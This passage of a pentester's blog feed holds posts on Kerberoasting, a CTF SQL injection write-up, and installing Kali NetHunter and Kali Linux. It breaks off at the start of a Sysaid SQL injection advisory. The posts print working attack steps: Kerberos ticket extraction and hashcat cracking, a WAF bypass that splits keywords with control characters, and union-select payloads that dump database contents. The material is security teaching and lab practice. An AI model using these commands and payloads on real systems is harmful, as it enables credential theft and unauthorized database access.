/&gt;http://alfanetworkinc.blogspot.dk/2015/08/blog-post.html&lt;br /&gt;&lt;br /&gt;</content><author><name>Hland</name></author><summary type="html">Due to shoddy WiFi in my office I had to setup my computer with another adapter to try to get some better signal.If you are on Windows 10, going to &quot;Device management&quot; and clicking &quot;Update driver&quot; is all it takes to get the drivers for this adapter.Just like this blog post from Alfa Networks says:http://alfanetworkinc.blogspot.dk/2015/08/blog-post.html</summary></entry><entry><title type="html">Springtime Kerberoasting</title><link href="http://localhost:4000/2017/05/15/springtime-kerberoasting.html" rel="alternate" type="text/html" title="Springtime Kerberoasting" /><published>2017-05-15T20:50:00+02:00</published><updated>2017-05-15T20:50:00+02:00</updated><id>http://localhost:4000/2017/05/15/springtime-kerberoasting</id><content type="html" xml:base="http://localhost:4000/2017/05/15/springtime-kerberoasting.html">&lt;p&gt;After getting some motivation from recent talks I attended I have decided to do some Kerberoasting in our Windows domain. &lt;/p&gt; &lt;p&gt;There are lots of excellent articles out there such as Harmj0y’s &lt;a href=&quot;http://www.harmj0y.net/blog/powershell/kerberoasting-without-mimikatz/&quot;&gt;article&lt;/a&gt;. In there you can find a bunch of references to other good and original articles on the subject.  &lt;br&gt;The reason I’m writing this blog post is that there are lots of tools out there and some require specific versions of John the Ripper and so on so I decided to document one path that I have taken here.&lt;/p&gt; &lt;p&gt;First, on a domain joined Windows computer run the following script by Harmj0y: &lt;br&gt;&lt;a href=&quot;https://gist.github.com/HarmJ0y/53a837fce877e32e18d78acbb08c8fe9&quot;&gt;https://gist.github.com/HarmJ0y/53a837fce877e32e18d78acbb08c8fe9&lt;/a&gt;&lt;/p&gt;   &lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs vala&quot;&gt;powershell -exec bypass&lt;br /&gt;&lt;br /&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;# Load the script&lt;/span&gt;&lt;br /&gt;. ./Invoke-Kerberoast.ps1&lt;br /&gt;&lt;br /&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;# Do a test run to see &lt;/span&gt;&lt;br /&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;# that it's working&lt;/span&gt;&lt;br /&gt;Invoke-Kerberoast | fl &lt;br /&gt;&lt;br /&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;# Get the tickets in John&lt;/span&gt;&lt;br /&gt;&lt;span class=&quot;hljs-preprocessor&quot;&gt;# format and convert to CSV format&lt;/span&gt;&lt;br /&gt;Invoke-Kerberoast -AdminCount -OutputFormat john | ConvertTo-Csv -NoTypeInformation | out-file kerbe&lt;br /&gt;roasts.csv&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;The next step is to start cracking the tickets in Kirbi format that we obtained. We can use either John The Ripper or Hashcat. I decided on Hashcat as this can make use of the GPU with oclHashcat.&lt;/p&gt; &lt;pre class=&quot;prettyprint&quot;&gt;&lt;code class=&quot; hljs lasso&quot;&gt;hashcat &lt;span class=&quot;hljs-attribute&quot;&gt;-a3&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;13100&lt;/span&gt; service_tickets_hashcat&lt;span class=&quot;hljs-built_in&quot;&gt;.&lt;/span&gt;txt rockyou&lt;span class=&quot;hljs-built_in&quot;&gt;.&lt;/span&gt;txt&lt;br /&gt;hashcat &lt;span class=&quot;hljs-attribute&quot;&gt;-a3&lt;/span&gt; &lt;span class=&quot;hljs-attribute&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;hljs-number&quot;&gt;13100&lt;/span&gt; service_tickets_hashcat&lt;span class=&quot;hljs-built_in&quot;&gt;.&lt;/span&gt;txt &lt;span class=&quot;hljs-subst&quot;&gt;--&lt;/span&gt;show&lt;/code&gt;&lt;/pre&gt; &lt;p&gt;Another option for doing this on a red team engagement is to use Powershell Empire’s module for it &lt;code&gt;powershell/credentials/invoke-kerberoast&lt;/code&gt;.&lt;/p&gt; &lt;h3 id=&quot;other-tools-and-resources&quot;&gt;Other tools and resources&lt;/h3&gt; &lt;p&gt;&lt;a href=&quot;https://github.com/nidem/kerberoast&quot;&gt;https://github.com/nidem/kerberoast&lt;/a&gt; &lt;br&gt;&lt;a href=&quot;https://room362.com/post/2016/kerberoast-pt1/&quot;&gt;https://room362.com/post/2016/kerberoast-pt1/&lt;/a&gt; &lt;br&gt;&lt;a href=&quot;http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/&quot;&gt;http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/&lt;/a&gt;&lt;/p&gt;</content><author><name>Hland</name></author><category term="activedirectory" /><category term="kerberoast" /><category term="adsecurity" /><summary type="html">After getting some motivation from recent talks I attended I have decided to do some Kerberoasting in our Windows domain. There are lots of excellent articles out there such as Harmj0y’s article. In there you can find a bunch of references to other good and original articles on the subject. The reason I’m writing this blog post is that there are lots of tools out there and some require specific versions of John the Ripper and so on so I decided to document one path that I have taken here. First, on a domain joined Windows computer run the following script by Harmj0y: https://gist.github.com/HarmJ0y/53a837fce877e32e18d78acbb08c8fe9 powershell -exec bypass# Load the script. ./Invoke-Kerberoast.ps1# Do a test run to see # that it's workingInvoke-Kerberoast | fl # Get the tickets in John# format and convert to CSV formatInvoke-Kerberoast -AdminCount -OutputFormat john | ConvertTo-Csv -NoTypeInformation | out-file kerberoasts.csv The next step is to start cracking the tickets in Kirbi format that we obtained. We can use either John The Ripper or Hashcat. I decided on Hashcat as this can make use of the GPU with oclHashcat. hashcat -a3 -m 13100 service_tickets_hashcat.txt rockyou.txthashcat -a3 -m 13100 service_tickets_hashcat.txt --show Another option for doing this on a red team engagement is to use Powershell Empire’s module for it powershell/credentials/invoke-kerberoast. Other tools and resources https://github.com/nidem/kerberoast https://room362.com/post/2016/kerberoast-pt1/ http://www.harmj0y.net/blog/activedirectory/targeted-kerberoasting/</summary></entry><entry><title type="html">Simplesqlin</title><link href="http://localhost:4000/2017/03/01/simplesqlin.html" rel="alternate" type="text/html" title="Simplesqlin" /><published>2017-03-01T00:00:00+01:00</published><updated>2017-03-01T00:00:00+01:00</updated><id>http://localhost:4000/2017/03/01/simplesqlin</id><content type="html" xml:base="http://localhost:4000/2017/03/01/simplesqlin.html">&lt;p&gt;The server runs &lt;code class=&quot;highlighter-rouge&quot;&gt;openresty/1.11.2.2&lt;/code&gt; according to the response headers.&lt;/p&gt;
+
+&lt;p&gt;Injection point is here:
+&lt;code class=&quot;highlighter-rouge&quot;&gt;http://202.120.7.203/index.php?id=1*&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;We can add or subtract or multiply numbers..&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://202.120.7.203/index.php?id=2-1&lt;/code&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;http://202.120.7.203/index.php?id=2%2b1&lt;/code&gt;
+&lt;code class=&quot;highlighter-rouge&quot;&gt;http://202.120.7.203/index.php?id=2*1&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;By doing &lt;code class=&quot;highlighter-rouge&quot;&gt;order by&lt;/code&gt; we find the column number, which is 3. &lt;code class=&quot;highlighter-rouge&quot;&gt;order by 4&lt;/code&gt; gives a 500 error:&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://202.120.7.203/index.php?id=1%20order%20by%203--+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Anything else so far results in 500 errors.
+There is a WAF blocking certain keywords. List of blocked keywords:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SELECT&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;FROM&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;WHERE&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;SLEEP&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;We can bypass the WAF by inserting a control character inside the keywords. Here we used &lt;code class=&quot;highlighter-rouge&quot;&gt;%0b&lt;/code&gt; which is vertical tabulation.&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;http://202.120.7.203/index.php?id=2 uni%0bon+se%0blect 1,&quot;a&quot;,3 order by 1--+&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;Other control characters that work in this case are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%0c&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%0E&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%0F&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;%10 - %1f&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;So the WAF is relatively easily bypassed.&lt;/p&gt;
+
+&lt;p&gt;Now we need to find the table in which the flag is stored. Because I suck at remembering Mysql special tables and such I used a resource like this:&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet&quot;&gt;MySQL Injection Cheat Sheet&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Then we do a query like this:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://202.120.7.203/index.php?id=2 uni%0bon+se%1flect table_schema,table_name,1 FR%0bOM information_schema.tables WHE%0bRE table_schema != 'mysql' AND table_schema != 'information_schema' order by 3--+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;To find that there is a table called &lt;code class=&quot;highlighter-rouge&quot;&gt;flag&lt;/code&gt;, duh.&lt;/p&gt;
+
+&lt;p&gt;And we can also get the column name in a similar fashion:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://202.120.7.203/index.php?id=2 uni%0bon+se%1flect table_schema,table_name,column_name FR%0bOM information_schema.columns WHE%0bRE table_schema != 'mysql' AND table_schema != 'information_schema' order by 3 LIMIT 1 OFFSET 1--+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And then finally we can get the flag by doing this query:&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://202.120.7.203/index.php?id=2 uni%0bon+se%1flect flag,1,2 FR%0bOM flag order by 3--+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;flag{W4f_bY_paSS_f0R_CI}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Hland</name></author><category term="CTF" /><category term="SQLi" /><summary type="html">The server runs openresty/1.11.2.2 according to the response headers.</summary></entry><entry><title type="html">Installing Kali Linux Nethunter on Nexus 7 (2013 Wifi)</title><link href="http://localhost:4000/2017/02/04/installing-kali-linux-nethunter-on.html" rel="alternate" type="text/html" title="Installing Kali Linux Nethunter on Nexus 7 (2013 Wifi)" /><published>2017-02-04T19:02:00+01:00</published><updated>2017-02-04T19:02:00+01:00</updated><id>http://localhost:4000/2017/02/04/installing-kali-linux-nethunter-on</id><content type="html" xml:base="http://localhost:4000/2017/02/04/installing-kali-linux-nethunter-on.html">To install Nethunter on the Nexus 7 (Wifi 2013) edition we first need to unlock the bootloader of the device and root it. There are many guides on the Internet on how to do this, but the best source I have found so far is the Offensive Secuirty Github repository: &lt;a href=&quot;https://github.com/offensive-security/nethunter-LRT&quot;&gt;https://github.com/offensive-security/nethunter-LRT&lt;/a&gt;.&lt;br /&gt;&lt;br /&gt;This repository contains a collection of scripts that help you install Kali Linux Nethunter on either a Nexus or OnePlusOne device. Their instructions are straightforward and their scripts are close to fully automated and work very well. It does require that you download a few things before using the scripts, but there are links that help you along.&lt;br /&gt;The major advantage of these scripts over some other tools that I found is that they can run from Linux or OS X.  First we must install Android Studio (or just binaries) to get ADB and fastboot. Next we must download and place the following into their respective folders in the cloned repo:&lt;br /&gt;&lt;br /&gt;&lt;ul&gt;&lt;li&gt;Stock Android image&amp;nbsp;&lt;/li&gt;&lt;ul&gt;&lt;li&gt;https://developers.google.com/android/images?hl=en#razor&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;Team Win Root Project (TWRP)&lt;/li&gt;&lt;ul&gt;&lt;li&gt;https://dl.twrp.me/flo/&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;SuperSU binary by ChainFire&lt;/li&gt;&lt;ul&gt;&lt;li&gt;http://download.chainfire.eu/752/SuperSU/BETA-SuperSU-v2.65-20151226141550.zip (this is the most shady part. I chose this as it was the only one that worker at the time)&lt;/li&gt;&lt;/ul&gt;&lt;li&gt;Kali Nethunter image&lt;/li&gt;&lt;ul&gt;&lt;li&gt;https://www.offensive-security.com/kali-linux-nethunter-download/&lt;/li&gt;&lt;/ul&gt;&lt;/ul&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Once these are in place we can go ahead and unlock the bootloader if it isn't already unlocked. Just run the script ./oemUnlock.sh.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Next we flash the stock Android image to have a clean device to install to. After installing, booting, setting up the device (manually), &amp;nbsp;we can run the script that installs the Custom Recovery from TWRP, sets up the SuperSU binary to maintain root and installs Kali Linux Nethunter.&amp;nbsp;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;The last step requires us to select some things we want included in Kali Linux Nethunter, and then the intallation proceeds.&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;If everything was successful we will have a working Nethunter device and we can go hack. Happy hacking.&amp;nbsp;&lt;/div&gt;</content><author><name>Hland</name></author><summary type="html">To install Nethunter on the Nexus 7 (Wifi 2013) edition we first need to unlock the bootloader of the device and root it. There are many guides on the Internet on how to do this, but the best source I have found so far is the Offensive Secuirty Github repository: https://github.com/offensive-security/nethunter-LRT.This repository contains a collection of scripts that help you install Kali Linux Nethunter on either a Nexus or OnePlusOne device. Their instructions are straightforward and their scripts are close to fully automated and work very well. It does require that you download a few things before using the scripts, but there are links that help you along.The major advantage of these scripts over some other tools that I found is that they can run from Linux or OS X. First we must install Android Studio (or just binaries) to get ADB and fastboot. Next we must download and place the following into their respective folders in the cloned repo:Stock Android image&amp;nbsp;https://developers.google.com/android/images?hl=en#razorTeam Win Root Project (TWRP)https://dl.twrp.me/flo/SuperSU binary by ChainFirehttp://download.chainfire.eu/752/SuperSU/BETA-SuperSU-v2.65-20151226141550.zip (this is the most shady part. I chose this as it was the only one that worker at the time)Kali Nethunter imagehttps://www.offensive-security.com/kali-linux-nethunter-download/Once these are in place we can go ahead and unlock the bootloader if it isn't already unlocked. Just run the script ./oemUnlock.sh.Next we flash the stock Android image to have a clean device to install to. After installing, booting, setting up the device (manually), &amp;nbsp;we can run the script that installs the Custom Recovery from TWRP, sets up the SuperSU binary to maintain root and installs Kali Linux Nethunter.&amp;nbsp;The last step requires us to select some things we want included in Kali Linux Nethunter, and then the intallation proceeds.If everything was successful we will have a working Nethunter device and we can go hack. Happy hacking.&amp;nbsp;</summary></entry><entry><title type="html">Installing Kali Linux on Debian in DigitalOcean</title><link href="http://localhost:4000/2017/01/19/installing-kali-linux-on-debian-in.html" rel="alternate" type="text/html" title="Installing Kali Linux on Debian in DigitalOcean" /><published>2017-01-19T19:49:00+01:00</published><updated>2017-01-19T19:49:00+01:00</updated><id>http://localhost:4000/2017/01/19/installing-kali-linux-on-debian-in</id><content type="html" xml:base="http://localhost:4000/2017/01/19/installing-kali-linux-on-debian-in.html">DigitalOcean is a nice and relatively cheap way to run virtual machines in the cloud. As a pentester I like to use Kali Linux which comes with a great number of useful tools. The problem is that DigitalOcean does not have a Kali Linux droplet or a way of installing custom images, at least not to my knowledge. But since Kali Linux is based on Debian let's go ahead and try installing Kali Linux packages on top of the latest Debian image available from DigitalOcean.&lt;br /&gt;&lt;br /&gt;We start by creating a droplet, I used the Debian 8.7 x64 distribution and if you are gonna run Kali Linux you should probably go with at least size number 2 which has 1gb of RAM at 10$/month.&lt;br /&gt;&lt;br /&gt;Add an SSH key to the droplet, spin it up and login to the box.&lt;br /&gt;&lt;br /&gt;Let's find the sources for the Kali Linux packages from here:&lt;br /&gt;&lt;a href=&quot;http://docs.kali.org/general-use/kali-linux-sources-list-repositories&quot;&gt;http://docs.kali.org/general-use/kali-linux-sources-list-repositories&lt;/a&gt;&lt;br /&gt;&lt;br /&gt;I wanna use the latest Rolling distribution that gets updates continuously so I'll use:&lt;br /&gt;&lt;pre&gt;&lt;code&gt;deb http://http.kali.org/kali kali-rolling main contrib non-free&lt;/code&gt;&lt;/pre&gt;&lt;br /&gt;We add this to the /etc/apt/sources.list file on the system.&lt;br /&gt;&lt;pre&gt;&lt;code&gt;root@mybox:~# echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; &amp;gt;&amp;gt; /etc/apt/sources.list&lt;br /&gt;&lt;br /&gt;cat /etc/apt/sources.list&lt;br /&gt;...&lt;br /&gt;&lt;br /&gt;# jessie-updates, previously known as 'volatile'&lt;br /&gt;deb http://mirrors.digitalocean.com/debian jessie-updates main&lt;br /&gt;deb-src http://mirrors.digitalocean.com/debian jessie-updates main&lt;br /&gt;deb http://http.kali.org/kali kali-rolling main contrib non-free&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br /&gt;Next we need to import the GPG key for the sources so that we can verify the packages. I looked up the key from an existing Kali Linux installation:&lt;br /&gt;&lt;br /&gt;&lt;pre&gt;&lt;code&gt;root@aKaliBoxIhad:~# apt-key list --with-fingerprint&lt;br /&gt;&lt;snipped&gt;...&lt;/snipped&gt;&lt;br /&gt;/etc/apt/trusted.gpg.d/kali-archive-keyring.gpg&lt;br /&gt;&lt;br /&gt;-----------------------------------------------&lt;br /&gt;&lt;br /&gt;pub &amp;nbsp; rsa4096 2012-03-05 [SC] [expires: 2018-02-02]&lt;br /&gt;&lt;br /&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; 44C6 513A 8E4F B3D3 0875 &amp;nbsp;F758 ED44 4FF0 7D8D 0BF6&lt;br /&gt;&lt;br /&gt;uid &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [ unknown] Kali Linux Repository &amp;lt;devel@kali.org&amp;gt;&lt;br /&gt;&lt;br /&gt;sub &amp;nbsp; rsa4096 2012-03-05 [E] [expires: 2018-02-02]&lt;br /&gt;&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Next we add the key to the keychain by looking it up from keys.gnupg.net. Note: Do not use the short fingerprint!&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;pre&gt;&lt;code&gt;root@mybox:~# apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys ED444FF07D8D0BF6&lt;br /&gt;Executing: gpg --ignore-time-conflict --no-options --no-default-keyring --homedir /tmp/tmp.T551SpCEIH --no-auto-check-trustdb --trust-model always --primary-keyring /etc/apt/trusted.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-squeeze-automatic.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-squeeze-stable.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-wheezy-automatic.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-wheezy-stable.gpg --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6&lt;br /&gt;gpg: requesting key 7D8D0BF6 from hkp server keys.gnupg.net&lt;br /&gt;gpg: key 7D8D0BF6: public key &quot;Kali Linux Repository &lt;devel kali.org=&quot;&quot;&gt;&quot; imported&lt;br /&gt;gpg: Total number processed: 1&lt;br /&gt;gpg:               imported: 1  (RSA: 1)&lt;/devel&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Now update the packages and let's look at which Kali Linux packages we can install:&lt;/div&gt;&lt;div&gt;&lt;pre&gt;&lt;code&gt;root@mybox:~# apt-get update &amp;amp;&amp;amp; apt-get upgrade&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;All the Kali Linux meta packages are listed here:&lt;/div&gt;&lt;div&gt;&lt;a href=&quot;https://www.kali.org/news/kali-linux-metapackages/&quot;&gt;https://www.kali.org/news/kali-linux-metapackages/&lt;/a&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;So for instance to install the top 10 tools of Kali Linux, we do:&lt;/div&gt;&lt;div&gt;&lt;pre&gt;&lt;code&gt;root@mybox:~# apt-get install kali-linux-top10&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div&gt;&lt;/div&gt;&lt;br /&gt;&lt;div&gt;Now we will have for among other tools, &amp;nbsp;Metasploit, installed on the server. Let's start it up&lt;br /&gt;&lt;br /&gt;&lt;pre&gt;&lt;code&gt;root@mybox:~# /etc/init.d/postgresql start&lt;br /&gt;&lt;br /&gt;root@mybox:~# msfdb init&lt;br /&gt;&lt;br /&gt;root@mybox:~# msfconsole&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;                 _---------.&lt;br /&gt;             .' #######   ;.&quot;&lt;br /&gt;  .---,.    ;@             @@`;   .---,..&lt;br /&gt;.&quot; @@@@@'.,'@@            @@@@@',.'@@@@ &quot;.&lt;br /&gt;'-.@@@@@@@@@@@@@          @@@@@@@@@@@@@ @;&lt;br /&gt;   `.@@@@@@@@@@@@        @@@@@@@@@@@@@@ .'&lt;br /&gt;     &quot;--'.@@@  -.@        @ ,'-   .'--&quot;&lt;br /&gt;          &quot;.@' ; @       @ `.  ;'&lt;br /&gt;            |@@@@ @@@     @    .&lt;br /&gt;             ' @@@ @@   @@    ,&lt;br /&gt;              `.@@@@    @@   .&lt;br /&gt;                ',@@     @   ;           _____________&lt;br /&gt;                 (   3 C    )     /|___ / Metasploit! \&lt;br /&gt;                 ;@'. __*__,.&quot;    \|--- \_____________/&lt;br /&gt;                  '(.,....&quot;/&lt;br /&gt;&lt;br /&gt;&lt;br /&gt;Validate lots of vulnerabilities to demonstrate exposure&lt;br /&gt;with Metasploit Pro -- Learn more on http://rapid7.com/metasploit&lt;br /&gt;&lt;br /&gt;       =[ metasploit v4.13.14-dev                         ]&lt;br /&gt;+ -- --=[ 1613 exploits - 915 auxiliary - 279 post        ]&lt;br /&gt;+ -- --=[ 471 payloads - 39 encoders - 9 nops             ]&lt;br /&gt;+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]&lt;br /&gt;&lt;br /&gt;msf &amp;gt;&lt;br /&gt;&lt;/code&gt;&lt;/pre&gt;&lt;br /&gt;&lt;br /&gt;&lt;/div&gt;&lt;div&gt;Now we can get hacking :D&lt;/div&gt;&lt;div&gt;&lt;br /&gt;&lt;/div&gt;</content><author><name>Hland</name></author><category term="Debian" /><category term="DigitalOcean" /><category term="Sysadm" /><category term="Kali" /><summary type="html">DigitalOcean is a nice and relatively cheap way to run virtual machines in the cloud. As a pentester I like to use Kali Linux which comes with a great number of useful tools. The problem is that DigitalOcean does not have a Kali Linux droplet or a way of installing custom images, at least not to my knowledge. But since Kali Linux is based on Debian let's go ahead and try installing Kali Linux packages on top of the latest Debian image available from DigitalOcean.We start by creating a droplet, I used the Debian 8.7 x64 distribution and if you are gonna run Kali Linux you should probably go with at least size number 2 which has 1gb of RAM at 10$/month.Add an SSH key to the droplet, spin it up and login to the box.Let's find the sources for the Kali Linux packages from here:http://docs.kali.org/general-use/kali-linux-sources-list-repositoriesI wanna use the latest Rolling distribution that gets updates continuously so I'll use:deb http://http.kali.org/kali kali-rolling main contrib non-freeWe add this to the /etc/apt/sources.list file on the system.root@mybox:~# echo &quot;deb http://http.kali.org/kali kali-rolling main contrib non-free&quot; &amp;gt;&amp;gt; /etc/apt/sources.listcat /etc/apt/sources.list...# jessie-updates, previously known as 'volatile'deb http://mirrors.digitalocean.com/debian jessie-updates maindeb-src http://mirrors.digitalocean.com/debian jessie-updates maindeb http://http.kali.org/kali kali-rolling main contrib non-freeNext we need to import the GPG key for the sources so that we can verify the packages. I looked up the key from an existing Kali Linux installation:root@aKaliBoxIhad:~# apt-key list --with-fingerprint.../etc/apt/trusted.gpg.d/kali-archive-keyring.gpg-----------------------------------------------pub &amp;nbsp; rsa4096 2012-03-05 [SC] [expires: 2018-02-02]&amp;nbsp; &amp;nbsp; &amp;nbsp; 44C6 513A 8E4F B3D3 0875 &amp;nbsp;F758 ED44 4FF0 7D8D 0BF6uid &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; [ unknown] Kali Linux Repository &amp;lt;devel@kali.org&amp;gt;sub &amp;nbsp; rsa4096 2012-03-05 [E] [expires: 2018-02-02]Next we add the key to the keychain by looking it up from keys.gnupg.net. Note: Do not use the short fingerprint!root@mybox:~# apt-key adv --keyserver hkp://keys.gnupg.net --recv-keys ED444FF07D8D0BF6Executing: gpg --ignore-time-conflict --no-options --no-default-keyring --homedir /tmp/tmp.T551SpCEIH --no-auto-check-trustdb --trust-model always --primary-keyring /etc/apt/trusted.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-jessie-automatic.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-jessie-security-automatic.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-jessie-stable.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-squeeze-automatic.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-squeeze-stable.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-wheezy-automatic.gpg --keyring /etc/apt/trusted.gpg.d/debian-archive-wheezy-stable.gpg --keyserver hkp://keys.gnupg.net --recv-keys 7D8D0BF6gpg: requesting key 7D8D0BF6 from hkp server keys.gnupg.netgpg: key 7D8D0BF6: public key &quot;Kali Linux Repository &quot; importedgpg: Total number processed: 1gpg: imported: 1 (RSA: 1)Now update the packages and let's look at which Kali Linux packages we can install:root@mybox:~# apt-get update &amp;amp;&amp;amp; apt-get upgradeAll the Kali Linux meta packages are listed here:https://www.kali.org/news/kali-linux-metapackages/So for instance to install the top 10 tools of Kali Linux, we do:root@mybox:~# apt-get install kali-linux-top10Now we will have for among other tools, &amp;nbsp;Metasploit, installed on the server. Let's start it uproot@mybox:~# /etc/init.d/postgresql startroot@mybox:~# msfdb initroot@mybox:~# msfconsole _---------. .' ####### ;.&quot; .---,. ;@ @@`; .---,...&quot; @@@@@'.,'@@ @@@@@',.'@@@@ &quot;.'-.@@@@@@@@@@@@@ @@@@@@@@@@@@@ @; `.@@@@@@@@@@@@ @@@@@@@@@@@@@@ .' &quot;--'.@@@ -.@ @ ,'- .'--&quot; &quot;.@' ; @ @ `. ;' |@@@@ @@@ @ . ' @@@ @@ @@ , `.@@@@ @@ . ',@@ @ ; _____________ ( 3 C ) /|___ / Metasploit! \ ;@'. __*__,.&quot; \|--- \_____________/ '(.,....&quot;/Validate lots of vulnerabilities to demonstrate exposurewith Metasploit Pro -- Learn more on http://rapid7.com/metasploit =[ metasploit v4.13.14-dev ]+ -- --=[ 1613 exploits - 915 auxiliary - 279 post ]+ -- --=[ 471 payloads - 39 encoders - 9 nops ]+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]msf &amp;gt;Now we can get hacking :D</summary></entry><entry><title type="html">Unauthenticated SQL Injection in Sysaid Helpdesk Free v.14.4.32. b25</title><link href="http://localhost:4000/2015/09/29/unauthenticated-sql-injection-in-sysaid.html" rel="alternate" type="text/html" title="Unauthenticated SQL Injection in Sysaid Helpdesk Free v.14.4.32. b25" /><published>2015-09-29T19:18:00+02:00</published><updated>2015-09-29T19:18:00+02:00</updated><id>http://localhost:4000/2015/09/29/unauthenticated-sql-injection-in-sysaid</id><content type="html" xml:base="http://localhost:4000/2015/09/29/unauthenticated-sql-injection-in-sysaid.html">&lt;p&gt;Discovered: June 2015&lt;/p&gt;
+
+&lt;p&gt;This is a flaw that I came across at a pentest for a client, the flaw ended up giving us enterprise admin access which isn’t too bad.&lt;/p&gt;
+
+&lt;p&gt;This issue is fixed in later versions and it seems that Sysaid have become aware of the issue on their own. This writeup is mostly for my own reference and everybody out there doing penetration testing encountering old versions of the software inside company networks.&lt;/p&gt;
+
